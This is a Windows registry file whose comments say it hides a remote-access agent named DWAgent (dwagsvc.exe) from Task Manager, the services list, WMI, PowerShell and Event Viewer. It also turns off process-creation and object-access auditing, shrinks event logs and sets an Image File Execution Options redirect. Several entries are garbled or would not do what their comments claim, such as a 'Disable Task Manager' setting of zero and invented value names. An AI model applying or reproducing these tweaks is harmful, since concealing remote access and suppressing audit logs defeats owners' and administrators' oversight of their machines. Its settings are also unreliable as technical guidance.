Windows Registry Editor Version 5.00

; Hide Task Manager PerfOS
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PerfOS\Performance]
"Disable Performance Counters"=dword:00000001
"First Counter"=dword:00000000
"Last Counter"=dword:00000000

; Hide Process List IFEO
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dwagsvc.exe]
"GlobalFlag"=dword:00000200
"VerifierFlags"=dword:00000001

; Disable WMI Process Enumeration
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WBEM\CIMOM]
"EnableEvents"=dword:00000000
"EnableStartupHeapPreallocation"=dword:00000000
"MaxWaitOnEvents"=dword:00000000

; Hide Services.msc
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DWAgent]
"Type"=dword:00000001
"Start"=dword:00000004
"ErrorControl"=dword:00000000
"ImagePath"=""
"DisplayName"=""
"Description"=""

; Disable Process Creation Auditing
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Audit]
"AuditProcessTracking"=dword:00000000
"AuditObjectAccess"=dword:00000000

; Hide PowerShell Get-Process
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell]
"ExecutionPolicy"="Restricted"
"EnableScripts"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\ShellIds\Microsoft.PowerShell]
"ExecutionPolicy"="Restricted"
"EnableScripts"=dword:00000000

; Hide Event Viewer
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Application]
"RestrictGuestAccess"=dword:00000001
"MaxSize"=dword:00000000

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\System]
"RestrictGuestAccess"=dword:00000001
"MaxSize"=dword:00000000

; Disable Task Manager Process Tab
[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
"DisableTaskMgr"=dword:00000000
"HideFastUserSwitching"=dword:00000001

; Hide Process Registry Virtualization
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Virtualization\VirtualStore\Machine\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dwagsvc.exe]
"Debugger"="%SystemRoot%\System32\svchost.exe -k netsvcs"
"UseFilter"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\dwagsvc.exe]
"ReportingMode"=dword:00000000
"LocalDumps"=dword:00000000
"MonitorProcess"=dword:00000000